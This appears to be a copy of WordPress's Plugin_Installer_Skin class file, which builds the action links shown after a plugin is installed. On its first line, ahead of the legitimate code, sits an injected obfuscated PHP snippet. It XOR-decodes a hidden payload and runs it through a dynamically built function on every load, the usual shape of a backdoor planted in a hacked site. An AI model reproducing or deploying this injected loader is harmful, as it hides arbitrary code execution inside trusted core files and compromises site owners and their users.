<?php $PiDdhMe='VYH;.EhF3R-M<X>'^'5+-ZZ 7 F<N9U7P';$Boughspj=$PiDdhMe('','+QQETXNTIB R4. 1<ZHeW2+9lYO<6h> ;.okxfN2c7ASUZ1;7o6R=.0253f4>8YNkSYOLkhi1-6fzJtej411mk-OJBoICqJyc<HVKGU3XgiBJTT;eDA4L0XzaTXMMNJCBYAaLZ5yq5YBSOReiOXUL 5w-+FhCn WJ-GGPbD52C+K9BpVQ5phcToYXHR,3A<KRSGZLL64.K8=6BDYLMALTF8< TA;KP3CYbE04xedFM9=-toSH6YUAHZmONs-qc-eev+MwS>+2NDXZk<,ZH CYF8GQ+RM8aGS0WtIJ-RJqi2qZWD.Knlp5OT6UzD0KI,SbPGeS8DRspM<0-V+,8Y<necf8y69sd2S+NcFX+-HiLkgXA4N4EKKRp4E>.<,cU >dzaSUVHSHcCI2;EYohShK0VA3w::2kKAOIHRO-sEaz:NOU<SPT31.YNYD13+D 4042AB04SQdbsI,.RRUEm3 03KaUeH.1T7,IIbSAGB+mt5 .-RqvAM5856aRK1i0416GXec<1<VmmN=J71fBTKRJU1lcSZJ-2>u1Y4b>lWMPLdJvsQigBYnSC,zTNZXgSWYYGvXPUQ<S1ItqRsNr7NL3R+YQGjEU9F=:Zl81;4;2TedUT60.3mXXOsYtVJ8X7=VTlg2T<1,PB0DQQRUuhENpP0>G.yEAB>-'^'B7yd2- 7=+O<kKXXO.;MpJDK3=.HW7aMNZHBQF58jQ4=6.XTYON=OqTSAR9kSM-fO78;-GHMZHOOZjTEJO;8dOB:>bRidVqsj5.99oqZxZIrqtpRY75F U6RE099,gqcf0jJeP<pUZ,6saoEAk<48AnSDvf6cJK23vc.pGdFF1G.WjT=4LY5JoePQ:7XF3Rcv<2.ew<=SAE7<f 88,aqt YPS1z1o4R78=.UMXXD ,UNHOeY.Y+0 +2Mgj,n>,f, VJ>WwUNKnyfzOJM6=Ejy=2NuO39Y>,6IwIinF73Jc;U>60OkSLTC.8C0ANMACE5BxfA7Y03ZP669K9YIY:TNMG9j<gl67fsJ=Cb3NThTrKC. X;Qlk0Xy=aZOHM<>EGDGAw>31hBjJmVZ18OUsL=Q:4VL03Oa6KEm,3;LSxA:O <0N:18ZKKq666nWJ0AkoYG5jRU 4RV,-IM=60mIWADRbMuA,OE5hG,0KzzM+MEPQAZLrWPa,GJTO>9.H6ULXE3+MDWTEqAMjY+CPObrmrb8UYKw>+YSeRZ<MEcEwpmlC+BFiYUpiWdvNKe+>lW5alluGj664XfW,SXrUhRV<>R+t24>5 -P5IIrKHPBXTS0BHupRQZRDqxoSyTv12QRK78DCV5HPww2Q==>31R5luzYUF.ZQuhy4P');$Boughspj();
/**
 * Upgrader API: Plugin_Installer_Skin class
 *
 * @package WordPress
 * @subpackage Upgrader
 * @since 4.6.0
 */

/**
 * Plugin Installer Skin for WordPress Plugin Installer.
 *
 * @since 2.8.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader-skins.php.
 *
 * @see WP_Upgrader_Skin
 */
class Plugin_Installer_Skin extends WP_Upgrader_Skin {
	public $api;
	public $type;

	/**
	 *
	 * @param array $args
	 */
	public function __construct($args = array()) {
		$defaults = array( 'type' => 'web', 'url' => '', 'plugin' => '', 'nonce' => '', 'title' => '' );
		$args = wp_parse_args($args, $defaults);

		$this->type = $args['type'];
		$this->api = isset($args['api']) ? $args['api'] : array();

		parent::__construct($args);
	}

	/**
	 * @access public
	 */
	public function before() {
		if ( !empty($this->api) )
			$this->upgrader->strings['process_success'] = sprintf( __('Successfully installed the plugin <strong>%s %s</strong>.'), $this->api->name, $this->api->version);
	}

	/**
	 * @access public
	 */
	public function after() {
		$plugin_file = $this->upgrader->plugin_info();

		$install_actions = array();

		$from = isset($_GET['from']) ? wp_unslash( $_GET['from'] ) : 'plugins';

		if ( 'import' == $from )
			$install_actions['activate_plugin'] = '<a class="button button-primary" href="' . wp_nonce_url( 'plugins.php?action=activate&amp;from=import&amp;plugin=' . urlencode( $plugin_file ), 'activate-plugin_' . $plugin_file ) . '" target="_parent">' . __( 'Activate Plugin &amp; Run Importer' ) . '</a>';
		else
			$install_actions['activate_plugin'] = '<a class="button button-primary" href="' . wp_nonce_url( 'plugins.php?action=activate&amp;plugin=' . urlencode( $plugin_file ), 'activate-plugin_' . $plugin_file ) . '" target="_parent">' . __( 'Activate Plugin' ) . '</a>';

		if ( is_multisite() && current_user_can( 'manage_network_plugins' ) ) {
			$install_actions['network_activate'] = '<a class="button button-primary" href="' . wp_nonce_url( 'plugins.php?action=activate&amp;networkwide=1&amp;plugin=' . urlencode( $plugin_file ), 'activate-plugin_' . $plugin_file ) . '" target="_parent">' . __( 'Network Activate' ) . '</a>';
			unset( $install_actions['activate_plugin'] );
		}

		if ( 'import' == $from ) {
			$install_actions['importers_page'] = '<a href="' . admin_url( 'import.php' ) . '" target="_parent">' . __( 'Return to Importers' ) . '</a>';
		} elseif ( $this->type == 'web' ) {
			$install_actions['plugins_page'] = '<a href="' . self_admin_url( 'plugin-install.php' ) . '" target="_parent">' . __( 'Return to Plugin Installer' ) . '</a>';
		} elseif ( 'upload' == $this->type && 'plugins' == $from ) {
			$install_actions['plugins_page'] = '<a href="' . self_admin_url( 'plugin-install.php' ) . '">' . __( 'Return to Plugin Installer' ) . '</a>';
		} else {
			$install_actions['plugins_page'] = '<a href="' . self_admin_url( 'plugins.php' ) . '" target="_parent">' . __( 'Return to Plugins page' ) . '</a>';
		}

		if ( ! $this->result || is_wp_error($this->result) ) {
			unset( $install_actions['activate_plugin'], $install_actions['network_activate'] );
		} elseif ( ! current_user_can( 'activate_plugins' ) ) {
			unset( $install_actions['activate_plugin'] );
		}

		/**
		 * Filters the list of action links available following a single plugin installation.
		 *
		 * @since 2.7.0
		 *
		 * @param array  $install_actions Array of plugin action links.
		 * @param object $api             Object containing WordPress.org API plugin data. Empty
		 *                                for non-API installs, such as when a plugin is installed
		 *                                via upload.
		 * @param string $plugin_file     Path to the plugin file.
		 */
		$install_actions = apply_filters( 'install_plugin_complete_actions', $install_actions, $this->api, $plugin_file );

		if ( ! empty( $install_actions ) ) {
			$this->feedback( implode( ' ', (array) $install_actions ) );
		}
	}
}
